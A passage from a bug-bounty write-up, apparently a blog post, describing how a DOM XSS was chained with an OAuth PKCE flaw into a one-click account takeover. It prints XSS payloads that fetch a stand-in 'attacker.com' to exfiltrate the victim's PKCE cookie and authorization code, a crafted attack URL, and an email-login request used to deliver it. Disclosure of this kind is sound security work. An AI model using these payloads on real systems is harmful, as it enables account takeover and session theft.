+      <img src="/2024/03/27/How-we-escalated-a-DOM-XSS-to-a-sophisticated-1-click-Account-Takeover-for-8000/Untitled%208b.png" alt="" data-action="zoom" class="photozoom">
+      
+    </div>
+
+<p>  <a href="/2024/03/27/How-we-escalated-a-DOM-XSS-to-a-sophisticated-1-click-Account-Takeover-for-8000/full_ato_diagram.svg">Link to the the sequence diagram in SVG format</a></p>
+<ol>
+<li><p>Victim clicks on the malicious link and login on page <code>account.redacted.com</code>. The link will look like this:</p>
+  <figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://account.redacted.com/authorize?redirect_uri=https://account.partner.com/oauth_callback?next=javascript://account.partner.com/%0A[XSS payload 1]&amp;response_type=code</span><br></pre></td></tr></tbody></table></figure></li>
+<li><p>After logging in successfully, <code>account.redacted.com</code> will return the <code>authorization_code</code> within the <code>redirect_uri</code> and then redirect victim to that <code>redirect_url</code> </p>
+ <figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redirect_url = redirect_uri + <span class="string">"&lt;authorization_code&gt;"</span></span><br></pre></td></tr></tbody></table></figure>
+<p> In this case, the redirect URL will be:</p>
+ <figure class="highlight jsx"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redirect_url = <span class="string">"https://account.partner.com/oauth_callback?next=javascript://account.partner.com/%0A[XSS payload 1]"</span> + <span class="string">"&amp;code=&lt;authorization_code&gt;"</span></span><br></pre></td></tr></tbody></table></figure>
+</li>
+<li><p><code>account.partner.com</code> will verify this <code>authorization_code</code> along with the <code>code_verifier</code>. </p>
+<p>  After that, the victim continues to get redirected to the URL stored in the parameter <code>next</code> <em>(which is also a XSS payload)</em></p>
+ <figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">next=javascript://account.partner.com/%0A[XSS payload 1]</span><br></pre></td></tr></tbody></table></figure>
+</li>
+<li><p>The <code>XSS payload 1</code> will trigger and do 3 things:</p>
+<ul>
+<li>Send the current victim’s cookie <code>bfe-pkce-2020</code> (<code>code_verifier</code>) back to attacker’s server</li>
+<li>Set the victim’s <code>bfe-pkce-2020</code> cookie to the attacker’s <code>bfe-pkce-2020</code> cookie</li>
+<li>Force the victim to perform the OAuth flow <code>again</code> with the <code>attacker's authorization code</code>. Hence, logging the victim to the attacker’s account.</li>
+</ul>
+<p> <em>XSS payload 1:</em></p>
+ <figure class="highlight jsx"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// The pkce is stored in the cookie, so we just need to send all the cookie to the attacker's server</span></span><br><span class="line"><span class="title function_">fetch</span>(<span class="string">"//attacker.com?pkce="</span> + <span class="variable language_">document</span>.<span class="property">cookies</span>)</span><br><span class="line">.<span class="title function_">then</span>(<span class="function"><span class="params">r</span> =&gt;</span> {</span><br><span class="line">	<span class="comment">// Set the attacker's pkce on the victim's browser</span></span><br><span class="line">	<span class="variable language_">document</span>.<span class="property">cookie</span>=<span class="string">"bfe-pkce-2020 = &lt;attacker_pkce&gt;"</span></span><br><span class="line">	<span class="comment">// Force the victim to perform the OAuth flow again to log the victim in the attacker's account and  trigger the 2nd XSS</span></span><br><span class="line">	<span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span> = <span class="string">"https://account.redacted.com/authorize?redirect_uri="</span> + <span class="title function_">url_encode</span>(<span class="string">"https://account.partner.com/oauth_callback?code=&lt;attacker-code&gt;&amp;next=javascript://account.partner.com/%0A[XSS payload 2]"</span>)</span><br><span class="line">})</span><br></pre></td></tr></tbody></table></figure>
+<p> This time the <code>redirect_uri</code> will looks like this:</p>
+ <figure class="highlight jsx"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">https</span>:<span class="comment">//account.partner.com/oauth_callback?code=&lt;attacker_code&gt;&amp;next=javascript://account.partner.com/%0A[XSS payload 2]</span></span><br></pre></td></tr></tbody></table></figure>
+</li>
+<li><p>Now, because both of the attacker’s <code>bfe-pkce-2020</code> and <code>code</code> is valid, the victim will now successfully log in the <code>attacker’s account</code> and trigger the redirection containing <code>XSS payload 2</code>. </p>
+<ul>
+<li>Please noticed on the first parameter <code>code</code> (<code>attacker_code</code>) is used for authenticating the victim to our attacker’s account. The second parameter <code>code</code> (<code>victim_code</code>) will still remain unused.</li>
+</ul>
+ 
+    <div>
+      <img src="/2024/03/27/How-we-escalated-a-DOM-XSS-to-a-sophisticated-1-click-Account-Takeover-for-8000/Untitled%209.png" alt="" data-action="zoom" class="photozoom">
+      
+    </div>
+<ul>
+<li>The <code>XSS payload 2</code> will send the <code>unused authorization_code</code> from the URL back to attacker sserver.</li>
+</ul>
+ <figure class="highlight jsx"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// the victim's authorization code will be in the url</span></span><br><span class="line"><span class="title function_">fetch</span>(<span class="string">"//attacker.com?code="</span> + <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>)</span><br></pre></td></tr></tbody></table></figure></li>
+</ol>
+</li>
+<li><p>Overall, the crafted exploit URLs and XSS payloads should look like this:</p>
+<ul>
+<li>Attack URL</li>
+</ul>
+  <figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://account.redacted.com/authorize?redirect_uri=javascript://account.partner.com/%0A[XSS payload 1]</span><br></pre></td></tr></tbody></table></figure>
+<ul>
+<li>XSS payload 1</li>
+</ul>
+  <figure class="highlight jsx"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// The pkce is stored in the cookie, so we just need to send all the cookie to the attacker's server</span></span><br><span class="line"><span class="title function_">fetch</span>(<span class="string">"//attacker.com?pkce="</span> + <span class="variable language_">document</span>.<span class="property">cookies</span>)</span><br><span class="line">.<span class="title function_">then</span>(<span class="function"><span class="params">r</span> =&gt;</span> {</span><br><span class="line">	<span class="comment">// Set the attacker's pkce on the victim's browser</span></span><br><span class="line">	<span class="variable language_">document</span>.<span class="property">cookie</span>=<span class="string">"bfe-pkce-2020 = &lt;attacker_pkce&gt;"</span></span><br><span class="line">	<span class="comment">// Force the victim to perform the OAuth flow again to log the victim in the attacker's account and  trigger the 2nd XSS</span></span><br><span class="line">	<span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span> = <span class="string">"https://account.redacted.com/authorize?redirect_uri="</span> + <span class="title function_">url_encode</span>(<span class="string">"https://account.partner.com/oauth_callback?code=&lt;attacker-code&gt;&amp;next=javascript://account.partner.com/%0A[XSS payload 2]"</span>)</span><br><span class="line">})</span><br></pre></td></tr></tbody></table></figure>
+<ul>
+<li>XSS payload 2</li>
+</ul>
+  <figure class="highlight jsx"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// the victim's authorization code will be in the url</span></span><br><span class="line"><span class="title function_">fetch</span>(<span class="string">"//attacker.com?code="</span> + <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>)</span><br></pre></td></tr></tbody></table></figure></li>
+<li><p>After receiving both of the victim’s <code>authorization_code</code> and <code>code_verifier</code> on our attacker’s server. We can use them to exchange for the access token 💪💪💪</p>
+</li>
+</ul>
+<h3 id="5-Escalate-escalate-escalate-…-to-one-click-mail-ATO"><a href="#5-Escalate-escalate-escalate-…-to-one-click-mail-ATO" class="headerlink" title="5. Escalate, escalate, escalate, … to one-click mail ATO"></a>5. Escalate, escalate, escalate, … to one-click mail ATO</h3><ul>
+<li>After the success in performing the ATO by tricking the user into clicking on the crafted link, this is clearly a valid issue and we could submit the bug and then rest 😴.</li>
+<li>However, our ego (😎) told us that this was still not the maximum impact of this bug, therefore, we continued to raise the impact.</li>
+<li>The problem that stops this bug from maximizing the impact is it requires a huge effort in the social engineering state to trick the victim into clicking on the crafted link. Obviously, there is a very small chance that the user will click on the lengthy link like that.</li>
+<li>At this state, the first possible solution that comes across our mind is using the logging with email verification link function and injecting the malicious link via redirect parameter.</li>
+<li>We continued to search the app and found all of the possible login portals. Luckily, we found 2 of them that allow user login via email.</li>
+<li>Here is the request:</li>
+</ul>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST /v1/email/login/request HTTP/2</span><br><span class="line">Host: api.xxxxxx.com</span><br><span class="line">Cookie: &lt;====SNIP====&gt;</span><br><span class="line">Accept: application/json, text/plain, */*</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Referer: https://account.xxxx.com/</span><br><span class="line">Content-Type: application/json</span><br><span class="line">X-Locale-Language: en-US</span><br><span class="line">Content-Length: 202</span><br><span class="line">Origin: https://account.xxxxx.com</span><br><span class="line">Sec-Fetch-Dest: empty</span><br><span class="line">Sec-Fetch-Mode: cors</span><br><span class="line">Sec-Fetch-Site: same-site</span><br><span class="line">Te: trailers</span><br><span class="line"></span><br><span class="line">{<span class="string">"email"</span>:<span class="string">"longtheshrimp@wearehackerone.com"</span>,<span class="string">"next_url"</span>:<span class="string">"&lt;===XSS_REDIRECT_HERE===&gt;"</span>,<span class="string">"login_session_uuid"</span>:<span class="string">"697a3410-11ff-4ba6-bd31-3b26ed7dfac5"</span>}</span><br></pre></td></tr></tbody></table></figure>
+
+<ul>
+<li>This will send an email with the log-in link to the victim</li>
+</ul>
+
+    <div>
+      <img src="/2024/03/27/How-we-escalated-a-DOM-XSS-to-a-sophisticated-1-click-Account-Takeover-for-8000/Untitled%2010.png" alt="" data-action="zoom" class="photozoom">
+      
+    </div>
+
+<ul>
+<li>After the victim clicks on the “Log in” button, there will be 2 cases:<ul>
+<li><code>If the victim is logged in:</code> The application will automatically redirect the victim back to our malicious link in the parameter <code>next_url</code> ⇒ The ATO XSS is triggered</li>
+<li><code>If the victim is not logged in:</code> This will redirect the victim to the login page.  After the victim enters their email and logs in, the victim will be redirected back to our malicious link in the parameter <code>next_url</code> ⇒ The ATO XSS is triggered</li>
+</ul>
+</li>
+</ul>
+<p>⇒ 💣💣💣 So that is our full chain of One-click ATO via the target’s email.</p>
+<h2 id="III-Conclusion"><a href="#III-Conclusion" class="headerlink" title="III. Conclusion"></a>III. Conclusion</h2><p>In our actual exploit, we have created a script to automate all the steps we’ve mentioned.</p>
+<p>We hope that you guys enjoy our first blog post! Some details has been ruled out (encoding, payload length limiting, …) in order to keep this blog post concise and not too confusing.</p>
+<p>Our hard work was paid off with a reward of $8000 🤩</p>
+
+    <div>
+      <img src="/2024/03/27/How-we-escalated-a-DOM-XSS-to-a-sophisticated-1-click-Account-Takeover-for-8000/Untitled%2011.png" alt="" data-action="zoom" class="photozoom">
+      
+    </div>
+
+<p>Thank you for reading! We hope that we’ll find more interesting cases in the future to share with you guys!</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Posts</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="http://github.com/benasin">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#I-Introduction"><span class="toc-number">1.</span> <span class="toc-text">I. Introduction</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#II-Our-discovery"><span class="toc-number">2.</span> <span class="toc-text">II. Our discovery</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-Investigating-the-login-flow-of-the-application-%F0%9F%91%80"><span class="toc-number">2.1.</span> <span class="toc-text">1. Investigating the login flow of the application 👀</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-Trying-out-the-text-book-OAuth-attack"><span class="toc-number">2.2.</span> <span class="toc-text">2. Trying out the text-book OAuth attack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-Finding-the-DOM-XSS"><span class="toc-number">2.3.</span> <span class="toc-text">3. Finding the DOM XSS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-First-attempt-on-performing-the-ATO"><span class="toc-number">2.4.</span> <span class="toc-text">3. First attempt on performing the ATO</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-How-we-overcome-the-1-time-code-issue"><span class="toc-number">2.5.</span> <span class="toc-text">4. How we overcome the 1-time code issue</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-Escalate-escalate-escalate-%E2%80%A6-to-one-click-mail-ATO"><span class="toc-number">2.6.</span> <span class="toc-text">5. Escalate, escalate, escalate, … to one-click mail ATO</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#III-Conclusion"><span class="toc-number">3.</span> <span class="toc-text">III. Conclusion</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://frogsec.github.io/2024/03/27/How-we-escalated-a-DOM-XSS-to-a-sophisticated-1-click-Account-Takeover-for-8000/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://frogsec.github.io/2024/03/27/How-we-escalated-a-DOM-XSS-to-a-sophisticated-1-click-Account-Takeover-for-8000/&amp;text=How we escalated a DOM XSS to a sophisticated 1-click Account Takeover for $8000"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://frogsec.github.io/2024/03/27/How-we-escalated-a-DOM-XSS-to-a-sophisticated-1-click-Account-Takeover-for-8000/&amp;title=How we escalated a DOM XSS to a sophisticated 1-click Account Takeover for $8000"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://frogsec.github.io/2024/03/27/How-we-escalated-a-DOM-XSS-to-a-sophisticated-1-click-Account-Takeover-for-8000/&amp;is_video=false&amp;description=How we escalated a DOM XSS to a sophisticated 1-click Account Takeover for $8000"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=How we escalated a DOM XSS to a sophisticated 1-click Account Takeover for $8000&amp;body=Check out this article: https://frogsec.github.io/2024/03/27/How-we-escalated-a-DOM-XSS-to-a-sophisticated-1-click-Account-Takeover-for-8000/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://frogsec.github.io/2024/03/27/How-we-escalated-a-DOM-XSS-to-a-sophisticated-1-click-Account-Takeover-for-8000/&amp;title=How we escalated a DOM XSS to a sophisticated 1-click Account Takeover for $8000"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://frogsec.github.io/2024/03/27/How-we-escalated-a-DOM-XSS-to-a-sophisticated-1-click-Account-Takeover-for-8000/&amp;title=How we escalated a DOM XSS to a sophisticated 1-click Account Takeover for $8000"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://frogsec.github.io/2024/03/27/How-we-escalated-a-DOM-XSS-to-a-sophisticated-1-click-Account-Takeover-for-8000/&amp;title=How we escalated a DOM XSS to a sophisticated 1-click Account Takeover for $8000"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://frogsec.github.io/2024/03/27/How-we-escalated-a-DOM-XSS-to-a-sophisticated-1-click-Account-Takeover-for-8000/&amp;title=How we escalated a DOM XSS to a sophisticated 1-click Account Takeover for $8000"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://frogsec.github.io/2024/03/27/How-we-escalated-a-DOM-XSS-to-a-sophisticated-1-click-Account-Takeover-for-8000/&amp;name=How we escalated a DOM XSS to a sophisticated 1-click Account Takeover for $8000&amp;description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://frogsec.github.io/2024/03/27/How-we-escalated-a-DOM-XSS-to-a-sophisticated-1-click-Account-Takeover-for-8000/&amp;t=How we escalated a DOM XSS to a sophisticated 1-click Account Takeover for $8000"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright ©
+    
+    
+    2023-2024
+    Benasin, LongTheShrimp, K0m3g4
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Posts</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/benasin">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'">
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+
+
+<script type="text/javascript">/**
+ * Pure JavaScript implementation of zoom.js.
+ *
+ * Original preamble:
+ * zoom.js - It's the best way to zoom an image
+ * @version v0.0.2
+ * @link https://github.com/fat/zoom.js
+ * @license MIT
+ *
+ * This is a fork of the original zoom.js implementation by @fat.
+ * Copyrights for the original project are held by @fat. All other copyright
+ * for changes in the fork are held by Nishanth Shanmugham.
+ *
+ * Copyright (c) 2013 @fat
+ * The MIT License. Copyright © 2016 Nishanth Shanmugham.
+ */
+!function(){"use strict";var t=function(){function t(t,e){for(var n=0;n<e.length;n++){var i=e[n];i.enumerable=i.enumerable||!1,i.configurable=!0,"value"in i&&(i.writable=!0),Object.defineProperty(t,i.key,i)}}return function(e,n,i){return n&&t(e.prototype,n),i&&t(e,i),e}}();function e(t,e){if(!(t instanceof e))throw new TypeError("Cannot call a class as a function")}!function(t){var e={};function n(i){if(e[i])return e[i].exports;var o=e[i]={i:i,l:!1,exports:{}};return t[i].call(o.exports,o,o.exports,n),o.l=!0,o.exports}n.m=t,n.c=e,n.i=function(t){return t},n.d=function(t,e,i){n.o(t,e)||Object.defineProperty(t,e,{configurable:!1,enumerable:!0,get:i})},n.n=function(t){var e=t&&t.__esModule?function(){return t.default}:function(){return t};return n.d(e,"a",e),e},n.o=function(t,e){return Object.prototype.hasOwnProperty.call(t,e)},n.p="",n(n.s=3)}([function(t,e,n){n.d(e,"a",function(){return i}),n.d(e,"b",function(){return o}),n.d(e,"c",function(){return r}),n.d(e,"d",function(){return a});var i=function(){return document.documentElement.clientWidth},o=function(){return document.documentElement.clientHeight},r=function(t){var e=t.getBoundingClientRect(),n=document.documentElement,i=window;return{top:e.top+i.pageYOffset-n.clientTop,left:e.left+i.pageXOffset-n.clientLeft}},a=function(t,e,n){t.addEventListener(e,function t(i){i.target.removeEventListener(e,t),n()})}},function(t,e,n){var i=n(2),o=n(0);n.d(e,"a",function(){return g});var r=null,a=-1,s=-1,c=function(t){document.body.classList.contains("zoom-overlay-open")||(t.metaKey||t.ctrlKey?window.open(t.target.getAttribute("data-original")||t.target.src,"_blank"):t.target.width>=n.i(o.a)()-80||(u(!0),(r=new i.a(t.target,80)).zoom(),l()))},u=function(t){null!=r&&(t?r.dispose():r.close(),d(),r=null)},l=function(){document.addEventListener("scroll",m),document.addEventListener("keyup",f),document.addEventListener("touchstart",h),document.addEventListener("click",v,!0)},d=function(){document.removeEventListener("scroll",m),document.removeEventListener("keyup",f),document.removeEventListener("touchstart",h),document.removeEventListener("click",v,!0)},m=function(){-1==a&&(a=window.pageYOffset),Math.abs(a-window.pageYOffset)>=40&&u()},f=function(t){27==t.keyCode&&u()},h=function(t){var e=t.touches[0];null!=e&&(s=e.pageY,t.target.addEventListener("touchmove",p))},p=function t(e){var n=e.touches[0];null!=n&&Math.abs(n.pageY-s)>10&&(u(),e.target.removeEventListener("touchmove",t))},v=function(){u()},g=Object.create(null);g.setup=function(t){t.addEventListener("click",c)}},function(n,i,o){var r=o(0),a=function t(n,i){e(this,t),this.w=n,this.h=i},s=function(){function n(t,i){e(this,n),this.img=t,this.preservedTransform=t.style.transform,this.wrap=null,this.caption=null,this.overlay=null,this.offset=i}return t(n,[{key:"forceRepaint",value:function(){this.img.offsetWidth}},{key:"zoom",value:function(){var t=new a(this.img.naturalWidth,this.img.naturalHeight);this.wrap=document.createElement("div"),this.wrap.classList.add("zoom-img-wrap"),this.img.parentNode.insertBefore(this.wrap,this.img),this.wrap.appendChild(this.img),this.img.classList.add("zoom-img"),this.img.setAttribute("data-action","zoom-out"),this.overlay=document.createElement("div"),this.overlay.classList.add("zoom-overlay"),this.caption=document.createElement("span"),this.caption.innerHTML=this.img.getAttribute("alt"),this.caption.classList.add("zoom-caption"),this.overlay.appendChild(this.caption),document.body.appendChild(this.overlay),this.forceRepaint();var e=this.calculateScale(t);this.forceRepaint(),this.animate(e),document.body.classList.add("zoom-overlay-open")}},{key:"calculateScale",value:function(t){var e=t.w/this.img.width,n=o.i(r.a)()-this.offset,i=o.i(r.b)()-this.offset,a=t.w/t.h,s=n/i;return t.w<n&&t.h<i?e:a<s?i/t.h*e:n/t.w*e}},{key:"animate",value:function(t){var e=o.i(r.c)(this.img),n=window.pageYOffset,i=o.i(r.a)()/2,a=n+o.i(r.b)()/2,s="scale("+t+")",c="translate3d("+(i-(e.left+this.img.width/2))+"px, "+(a-(e.top+this.img.height/2))+"px, 0px)";this.img.style.transform=s,this.wrap.style.transform=c}},{key:"dispose",value:function(){null!=this.wrap&&null!=this.wrap.parentNode&&(this.img.classList.remove("zoom-img"),this.img.setAttribute("data-action","zoom"),this.wrap.parentNode.insertBefore(this.img,this.wrap),this.wrap.parentNode.removeChild(this.wrap),document.body.removeChild(this.overlay),document.body.classList.remove("zoom-overlay-transitioning"))}},{key:"close",value:function(){var t=this;document.body.classList.add("zoom-overlay-transitioning"),this.img.style.transform=this.preservedTransform,0===this.img.style.length&&this.img.removeAttribute("style"),this.wrap.style.transform="none",o.i(r.d)(this.img,"transitionend",function(){t.dispose(),document.body.classList.remove("zoom-overlay-open")})}}]),n}();i.a=s},function(t,e,n){Object.defineProperty(e,"__esModule",{value:!0});var i=n(1);document.addEventListener("DOMContentLoaded",function(){for(var t=document.querySelectorAll("img[data-action='zoom']"),e=0;e<t.length;e++)i.a.setup(t[e])})}])}();</script><style>img[data-action=zoom]{cursor:pointer;cursor:-webkit-zoom-in;cursor:-moz-zoom-in}.zoom-img,.zoom-img-wrap{position:relative;z-index:666;-webkit-transition:all .3s;-o-transition:all .3s;transition:all .3s}img.zoom-img{cursor:pointer;cursor:-webkit-zoom-out;cursor:-moz-zoom-out}.zoom-overlay{z-index:420;text-align:center;background:#fff;position:fixed;top:0;left:0;right:0;bottom:0;pointer-events:none;filter:"alpha(opacity=0)";opacity:0;-webkit-transition:opacity .3s;-o-transition:opacity .3s;transition:opacity .3s}.zoom-overlay-open .zoom-overlay{filter:"alpha(opacity=100)";opacity:1}.zoom-overlay-open,.zoom-overlay-transitioning{cursor:default}.body-wrap-zoom{width:100vw}.zoom-caption{z-index:667;bottom:10px;position:fixed;left:10px;right:10px}.zoom-initial-caption{color:#999;display:block;font-size:.9em;margin-top:.5em;position:relative;text-align:center;}</style></body></html>
